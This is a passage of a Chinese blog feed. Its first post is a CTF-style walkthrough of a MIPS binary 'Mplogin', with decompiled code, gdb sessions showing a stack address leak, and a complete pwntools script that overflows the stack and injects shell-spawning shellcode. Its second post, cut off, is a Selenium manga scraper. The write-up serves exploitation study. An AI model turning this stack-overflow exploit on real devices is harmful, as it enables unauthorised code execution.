class="line">-----we1c0me t0 MP l0g1n s7stem-----</span><br><span class="line">Username : </span><br></pre></td></tr></table></figure><p>显然是要先输入一段字符串。</p><p>用IDA打开分析,首先f5看一下主函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// $a2</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [sp+18h] [+18h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, envp);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, v3);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\x1B[33m&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;-----we1c0me t0 MP l0g1n s7stem-----&quot;</span>);</span><br><span class="line">  v5 = sub_400840();</span><br><span class="line">  sub_400978(v5);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\x1B[32m&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Now you getshell~&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到sub_400840和sub_400978是主要用的函数，分别打开</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_400840</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1[<span class="number">24</span>]; <span class="comment">// [sp+18h] [+18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v1, <span class="number">0</span>, <span class="keyword">sizeof</span>(v1));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\x1B[34m&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Username : &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, v1, <span class="number">24</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(v1, <span class="string">&quot;admin&quot;</span>, <span class="number">5</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Correct name : %s&quot;</span>, v1);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strlen</span>(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，该函数将输入前5个字节与”admin”比较，相同则会打印correct，并继续程序，返回输入的长度。read函数不会检查内容的长度，可以输入一个长字符串填满栈上的缓冲区，在printf时对栈上的数据泄露。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_400978</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v2[<span class="number">20</span>]; <span class="comment">// [sp+18h] [+18h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [sp+2Ch] [+2Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">36</span>]; <span class="comment">// [sp+3Ch] [+3Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = a1 + <span class="number">4</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\x1B[31m&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Pre_Password : &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, v2, <span class="number">36</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Password : &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, v4, v3);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(v2, <span class="string">&quot;access&quot;</span>, <span class="number">6</span>) || <span class="built_in">strncmp</span>(v4, <span class="string">&quot;0123456789&quot;</span>, <span class="number">10</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Correct password : **********&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，该函数要输入两次，1次输入36字节v2，一次输入用户名长度加4字节的v4，分别进行比较，即可结束函数，由于第二次输入时的长度由v3控制，所以可以首先在首次输入时输入超过20字节溢出覆盖v3变量，v3变量即覆盖为超出的字节值，保证v3足够大即可，再次输入时由v3控制长度导致栈溢出。</p><p>构造三次输入进行试验</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin111111111111111111</span><br><span class="line">access11111111111111</span><br><span class="line">012345678911111111111111111111111111</span><br></pre></td></tr></table></figure><p>结果如下所示，显然有数据泄露和栈溢出的情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ssr@ubuntu:~/iot/Mplogin$ qemu-mipsel -L ./ Mplogin</span><br><span class="line">-----we1c0me t0 MP l0g1n s7stem-----</span><br><span class="line">Username : admin111111111111111111</span><br><span class="line">Correct name : admin111111111111111111</span><br><span class="line">���v�</span><br><span class="line">     @Pre_Password : access11111111111111</span><br><span class="line">Password : 012345678911111111111111111111111111  </span><br><span class="line">Correct password : **********</span><br><span class="line">Now you getshell~</span><br><span class="line">ssr@ubuntu:~/iot/Mplogin$ 11111111111111111111111111</span><br><span class="line">11111111111111111111111111：未找到命令</span><br></pre></td></tr></table></figure><p>第二个命令处非主动输入，可以由此着手找到执行shell的漏洞，下面开始分析原因</p><p>首先分析sub_400840的栈帧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.text:00400840 sub_400840:                              # CODE XREF: main+9C↓p</span><br><span class="line">.text:00400840</span><br><span class="line">.text:00400840 var_20          &#x3D; -0x20</span><br><span class="line">.text:00400840 var_18          &#x3D; -0x18</span><br><span class="line">.text:00400840 var_s0          &#x3D;  0</span><br><span class="line">.text:00400840 var_s4          &#x3D;  4</span><br><span class="line">.text:00400840</span><br><span class="line">.text:00400840                 addiu   $sp, -0x38</span><br><span class="line">.text:00400844                 sw      $ra, 0x30+var_s4($sp)</span><br><span class="line">.text:00400848                 sw      $fp, 0x30+var_s0($sp)</span><br><span class="line">.text:0040084C                 move    $fp, $sp</span><br><span class="line">.text:00400850                 li      $gp, 0x418E50</span><br><span class="line">.text:00400858                 sw      $gp, 0x30+var_20($sp)</span><br><span class="line">.text:0040085C                 li      $a2, 0x18</span><br><span class="line">.text:00400860                 move    $a1, $zero</span><br><span class="line">.text:00400864                 addiu   $v0, $fp, 0x30+var_18</span><br><span class="line">.text:00400868                 move    $a0, $v0</span><br><span class="line">.text:0040086C                 la      $v0, memset</span><br><span class="line">.text:00400870                 move    $t9, $v0</span><br><span class="line">.text:00400874                 jalr    $t9 ; memset</span><br></pre></td></tr></table></figure><p>在<code>v1[24]</code>后就是<code>$fp</code>，而在函数体之中<code>$fp</code>和<code>$sp</code>相同，均指向栈顶，所以这里泄露出了<code>main</code>函数进入<code>sub_400840</code>的栈顶地址。</p><p>首先使用<code>qemu-user</code>的<code>-g</code>模式在1234端口启动调试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-mipsel -g 1234 -L ./ Mplogin  | hexdump -C</span><br></pre></td></tr></table></figure><p>接下来使用gdb调试，命令如下，需要设置mips框架和小端模式，并在<code>main</code>函数调用<code>sub_400840</code>之前<code>0x00400B88</code>处下断点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">ssr@ubuntu:~/iot/Mplogin$ gdb-multiarch -q ./Mplogin</span><br><span class="line">pwndbg: loaded 190 commands. Type pwndbg [filter] <span class="keyword">for</span> a list.</span><br><span class="line">pwndbg: created <span class="variable">$rebase</span>, <span class="variable">$ida</span> gdb <span class="built_in">functions</span> (can be used with <span class="built_in">print</span>/<span class="built_in">break</span>)</span><br><span class="line">Reading symbols from ./Mplogin...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">gdb-peda$ <span class="built_in">set</span> architecture mips</span><br><span class="line">The target architecture is assumed to be mips</span><br><span class="line">gdb-peda$ <span class="built_in">set</span> endian little</span><br><span class="line">The target is assumed to be little endian</span><br><span class="line">gdb-peda$ b * 0x00400B88</span><br><span class="line">Breakpoint 1 at 0x400b88</span><br><span class="line">gdb-peda$ target remote :1234</span><br><span class="line">Remote debugging using :1234</span><br><span class="line">warning: remote target does not support file transfer, attempting to access files from <span class="built_in">local</span> filesystem.</span><br><span class="line">Reading symbols from /home/ssr/iot/Mplogin/lib/ld-uClibc.so.0...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line"></span><br><span class="line">此处省略程序开始处断点情况</span><br><span class="line"></span><br><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x00400b88 <span class="keyword">in</span> main ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line">*V0   0x25</span><br><span class="line">*V1   0x1</span><br><span class="line">*A0   0x767cd144 (_stdio_streams+92) ◂— 0x0</span><br><span class="line">*A1   0x76ffef48 —▸ 0x767d530a (m_sbox+12718) ◂— 0x0</span><br><span class="line">*A2   0x1</span><br><span class="line"> A3   0x0</span><br><span class="line">*T0   0x767e61a8 —▸ 0x76731000 ◂— 0x464c457f</span><br><span class="line">*T1   0x77cb3</span><br><span class="line"> T2   0x0</span><br><span class="line"> T3   0x0</span><br><span class="line">*T4   0x767e6048 ◂— 0x0</span><br><span class="line">*T5   0x1</span><br><span class="line">*T6   0xfffffff</span><br><span class="line">*T7   0x40056e ◂— <span class="string">&#x27;puts&#x27;</span></span><br><span class="line">*T8   0x1</span><br><span class="line">*T9   0x76743000 (__write_nocancel) ◂— lui    <span class="variable">$gp</span>, 9 /* <span class="string">&#x27;\t&#x27;</span> */</span><br><span class="line">*S0   0x76806010 ◂— 0x0</span><br><span class="line">*S1   0x4005d8 (_init) ◂— lui    <span class="variable">$gp</span>, 2</span><br><span class="line"> S2   0x0</span><br><span class="line"> S3   0x0</span><br><span class="line"> S4   0x0</span><br><span class="line"> S5   0x0</span><br><span class="line"> S6   0x0</span><br><span class="line"> S7   0x0</span><br><span class="line">*S8   0x76ffef90 —▸ 0x76806010 ◂— 0x0</span><br><span class="line">*FP   0x76ffefb8 ◂— 0x0</span><br><span class="line">*SP   0x76ffef90 —▸ 0x76806010 ◂— 0x0</span><br><span class="line">*PC   0x400b88 (main+156) ◂— jal    0x400840</span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line"> ► 0x400b88 &lt;main+156&gt;    jal    _ftext+512 &lt;0x400840&gt;</span><br><span class="line">   0x400b8c &lt;main+160&gt;    nop    </span><br><span class="line">   0x400b90 &lt;main+164&gt;    lw     <span class="variable">$gp</span>, 0x10(<span class="variable">$fp</span>)</span><br><span class="line">   0x400b94 &lt;main+168&gt;    sw     <span class="variable">$v0</span>, 0x18(<span class="variable">$fp</span>)</span><br><span class="line">   0x400b98 &lt;main+172&gt;    lw     <span class="variable">$a0</span>, 0x18(<span class="variable">$fp</span>)</span><br><span class="line">   0x400b9c &lt;main+176&gt;    jal    _ftext+824 &lt;0x400978&gt;</span><br><span class="line">   0x400ba0 &lt;main+180&gt;    nop    </span><br><span class="line">   0x400ba4 &lt;main+184&gt;    lw     <span class="variable">$gp</span>, 0x10(<span class="variable">$fp</span>)</span><br><span class="line">   0x400ba8 &lt;main+188&gt;    lui    <span class="variable">$v0</span>, 0x40</span><br><span class="line">   0x400bac &lt;main+192&gt;    addiu  <span class="variable">$a0</span>, <span class="variable">$v0</span>, 0xdfc</span><br><span class="line">   0x400bb0 &lt;main+196&gt;    lw     <span class="variable">$v0</span>, -0x7f98(<span class="variable">$gp</span>)</span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ s8 sp  0x76ffef90 —▸ 0x76806010 ◂— 0x0</span><br><span class="line">01:0004│        0x76ffef94 ◂— 0x0</span><br><span class="line">02:0008│        0x76ffef98 ◂— 0x2</span><br><span class="line">03:000c│        0x76ffef9c ◂— 0x1000</span><br><span class="line">04:0010│        0x76ffefa0 ◂— 0x418e50</span><br><span class="line">05:0014│        0x76ffefa4 —▸ 0x767aacc8 (__h_errno_location+40) ◂— lw     <span class="variable">$ra</span>, 0xc(<span class="variable">$sp</span>) /* <span class="string">&#x27;\x0c&#x27;</span> */</span><br><span class="line">06:0018│        0x76ffefa8 —▸ 0x767d53c0 (m_sbox+12900) ◂— 0x0</span><br><span class="line">07:001c│        0x76ffefac —▸ 0x4005d8 (_init) ◂— lui    <span class="variable">$gp</span>, 2</span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► f 0   400b88 main+156</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gdb-peda$ info reg</span><br><span class="line">          zero       at       v0       v1       a0       a1       a2       a3</span><br><span class="line"> R0   00000000 fffffff8 00000025 00000001 767cd144 76ffef48 00000001 00000000 </span><br><span class="line">            t0       t1       t2       t3       t4       t5       t6       t7</span><br><span class="line"> R8   767e61a8 00077cb3 00000000 00000000 767e6048 00000001 0fffffff 0040056e </span><br><span class="line">            s0       s1       s2       s3       s4       s5       s6       s7</span><br><span class="line"> R16  76806010 004005d8 00000000 00000000 00000000 00000000 00000000 00000000 </span><br><span class="line">            t8       t9       k0       k1       gp       sp       s8       ra</span><br><span class="line"> R24  00000001 76743000 00000000 00000000 00418e50 76ffef90 76ffef90 00400b84 </span><br><span class="line">            sr       lo       hi      bad    cause       pc</span><br><span class="line">      20000010 00000024 00000000 00000000 00000000 00400b88 </span><br><span class="line">           fsr      fir</span><br><span class="line">      00000000 00739300 </span><br></pre></td></tr></table></figure><p>可以看到此时FP寄存器真实值为s8处，即<code>0x76ffee90</code></p><p>在qemu终端输入字符串尝试填满缓冲区，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ssr@ubuntu:~/iot/Mplogin$ qemu-mipsel -g 1234 -L ./ Mplogin  | hexdump -C</span><br><span class="line">00000000  1b 5b 33 33 6d 2d 2d 2d  2d 2d 77 65 31 63 30 6d  |.[33m-----we1c0m|</span><br><span class="line">00000010  65 20 74 30 20 4d 50 20  6c 30 67 31 6e 20 73 37  |e t0 MP l0g1n s7|</span><br><span class="line">admin111111111111111111</span><br><span class="line">00000020  73 74 65 6d 2d 2d 2d 2d  2d 0a 1b 5b 33 34 6d 55  |stem-----..[34mU|</span><br><span class="line">00000030  73 65 72 6e 61 6d 65 20  3a 20 43 6f 72 72 65 63  |sername : Correc|</span><br><span class="line">00000040  74 20 6e 61 6d 65 20 3a  20 61 64 6d 69 6e 31 31  |t name : admin11|</span><br><span class="line">00000050  31 31 31 31 31 31 31 31  31 31 31 31 31 31 31 31  |1111111111111111|</span><br><span class="line">00000060  0a 90 ef ff 76 90 0b 40  1b 5b 33 31 6d 50 72 65  |....v..@.[31mPre|</span><br></pre></td></tr></table></figure><p>可以看到在60开始的行处有<code>0x76ffee90</code>的地址泄露，可以对泄露的栈地址进行利用。由于栈平衡，<code>sub_400978</code>和<code>sub_400840</code>都是main的同级调用函数，<code>0x76ffee90</code>在<code>sub_400978</code>栈上的返回地址后面，所以在<code>sub_400978</code>溢出点填写<code>0x76ffee90</code>，后边拼接shellcode即可。</p><p>以下为脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#设置pwn环境</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>,endian=<span class="string">&#x27;little&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process([<span class="string">&quot;qemu-mipsel&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;./&quot;</span>,<span class="string">&quot;./Mplogin&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取栈泄露地址</span></span><br><span class="line">io.sendafter(<span class="string">&quot;name : &quot;</span>,<span class="string">&quot;admin&quot;</span>.ljust(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">io.recvuntil(<span class="string">&quot;Correct name : &quot;</span>);</span><br><span class="line">io.recv(<span class="number">0x18</span>)</span><br><span class="line"><span class="comment">#接收四字节地址</span></span><br><span class="line">stack = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#覆盖修改v3值</span></span><br><span class="line">io.sendafter(<span class="string">&quot;Pre_Password : &quot;</span>,<span class="string">&quot;access&quot;</span>.ljust(<span class="number">0x14</span>,<span class="string">&quot;2&quot;</span>)+p32(<span class="number">0x100</span>))</span><br><span class="line"><span class="comment">#拼接shellcode</span></span><br><span class="line">io.sendafter(<span class="string">&quot;Password : &quot;</span>,<span class="string">&quot;0123456789&quot;</span>.ljust(<span class="number">0x28</span>,<span class="string">&quot;2&quot;</span>)+p32(stack)+asm(shellcraft.sh()))</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>主要参考资料：</p><ul><li><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/09/24/mips/">HWS赛题入门MIPS Pwn</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python-selenium爬取漫画</title>
      <link href="2020/11/19/python-selenium%E7%88%AC%E5%8F%96%E6%BC%AB%E7%94%BB/"/>
      <url>2020/11/19/python-selenium%E7%88%AC%E5%8F%96%E6%BC%AB%E7%94%BB/</url>
      
        <content type="html"><![CDATA[<p><img src="/2020/11/19/python-selenium%E7%88%AC%E5%8F%96%E6%BC%AB%E7%94%BB/9.jpg" alt="9"></p><p>想看化物语漫画，找到一家<a href="http://manhua.kukudm.com/comiclist/2372/">网站</a>开始爬取，就当练习爬虫。使用python的selenium框架。</p><a id="more"></a><p>首先进入主页按F12查看原码，可以看到所有章节的url信息都被存放在id为comiclistn的元素中</p><p><img src="/2020/11/19/python-selenium%E7%88%AC%E5%8F%96%E6%BC%AB%E7%94%BB/1.png" alt="1"></p><p>这样就很容易根据id定位获取各个章节的url了，具体函数如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_TOF</span>(<span class="params">index_url</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    从主页面获取各章节url</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    url_list=[]</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#模拟浏览器打开网站</span></span><br><span class="line">    browser=webdriver.Firefox(options=options)</span><br><span class="line">    browser.get(index_url)</span><br><span class="line">    browser.implicitly_wait(<span class="number">3</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#获取章节列表的元素</span></span><br><span class="line">    comics_list_id=browser.find_element_by_id(<span class="string">&quot;comiclistn&quot;</span>)</span><br><span class="line">    chapter_list=comics_list_id.find_elements_by_xpath(<span class="string">&quot;./*&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#生成章节列表</span></span><br><span class="line">    <span class="keyword">for</span> part <span class="keyword">in</span> chapter_list:</span><br><span class="line">        link=part.find_elements_by_tag_name(<span class="string">&#x27;a&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">        url_list.append(link.get_attribute(<span class="string">&#x27;href&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    browser.quit()</span><br><span class="line">    </span><br><span class="line">    Comics=<span class="built_in">dict</span>(name=Name,urls=url_list)</span><br><span class="line">    </span><br><span class="line">    print(<span class="string">&quot;目录信息爬取成功&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> Comics</span><br></pre></td></tr></table></figure><p>打开具体章节第一页查看源码，需要首先找到页数信息，发现页数没有固定元素，动态生成在文本信息里，所以需要分析其所在的父类的文本内容，用正则表达式提取总页数数字。</p><p><img src="/2020/11/19/python-selenium%E7%88%AC%E5%8F%96%E6%BC%AB%E7%94%BB/2.png" alt="2"></p><p>然后开始逐页提取图片的url和下一页链接的url</p><p><img src="/2020/11/19/python-selenium%E7%88%AC%E5%8F%96%E6%BC%AB%E7%94%BB/3.png" alt="3"></p><p>具体函数如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pic</span>(<span class="params">Comics</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    根据主页面获取的信息逐章爬取图片</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    comic_list=Comics[<span class="string">&#x27;urls&#x27;</span>]</span><br><span class="line">    basedir=Comics[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    browser=webdriver.Firefox(options=options)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> comic_list:</span><br><span class="line">        <span class="comment">#打开某一章节页面</span></span><br><span class="line">        browser.get(url)</span><br><span class="line">        browser.implicitly_wait(<span class="number">5</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#在本地创建文件夹保存</span></span><br><span class="line">        dirname=basedir+<span class="string">&#x27;/&#x27;</span>+browser.title</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(dirname):</span><br><span class="line">            os.mkdir(dirname)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#获取页数</span></span><br><span class="line">        temptext=browser.find_element_by_xpath(<span class="string">&quot;//*[contains(text(),&#x27;共&#x27;)]&quot;</span>).text</span><br><span class="line">        pageNum=<span class="built_in">int</span>(re.findall(<span class="string">r&#x27;\d+&#x27;</span>,temptext)[<span class="number">1</span>])</span><br><span class="line">        </span><br><span class="line">        print(<span class="string">&#x27;开始爬取\t&#123;&#125;  &#x27;</span>.<span class="built_in">format</span>(browser.title)+<span class="string">&#x27;共&#x27;</span>+<span class="built_in">str</span>(pageNum)+<span class="string">&#x27;页&#x27;</span>)</span><br><span class="line">        <span class="comment">#逐页爬取图片</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,pageNum):</span><br><span class="line">            <span class="comment">#获取图片url</span></span><br><span class="line">            pic_url=browser.find_element_by_tag_name(<span class="string">&#x27;img&#x27;</span>).get_attribute(<span class="string">&#x27;src&#x27;</span>)</span><br><span class="line">            filename=dirname+<span class="string">&#x27;/&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;.jpg&#x27;</span></span><br><span class="line">            <span class="comment">#保存图片到本地</span></span><br><span class="line">            SavePic(filename,pic_url)</span><br><span class="line">            <span class="comment">#获取下一页url</span></span><br><span class="line">            NextPage = browser.find_elements_by_tag_name(<span class="string">&#x27;a&#x27;</span>)[-<span class="number">1</span>].get_attribute(<span class="string">&#x27;href&#x27;</span>)</span><br><span class="line">            <span class="comment">#休息时间</span></span><br><span class="line">            time.sleep(<span 